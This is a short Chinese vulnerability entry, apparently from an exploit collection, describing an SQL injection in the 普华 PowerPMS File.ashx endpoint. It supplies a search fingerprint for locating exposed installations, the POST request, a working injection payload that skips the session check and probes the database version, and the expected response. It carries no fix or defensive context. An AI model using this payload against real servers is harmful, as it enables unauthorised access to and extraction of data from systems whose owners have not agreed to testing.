# 普华PowerpmsFile.ashx存在SQL注入漏洞

普华 ｜ SQL注入 ｜ —
- **指纹**：`app="普华科技-PowerPMS"`
- **请求**：`POST /PowerPlat/Control/File.ashx HTTP/1.1`

**Payload**
```
NoCheckSession=true&ServerOperatorType=OpenRecord&_fileid='and 1<@@VERSION--&_type=ftp&action=topdf&sessionid=1
```
- **响应特征**：200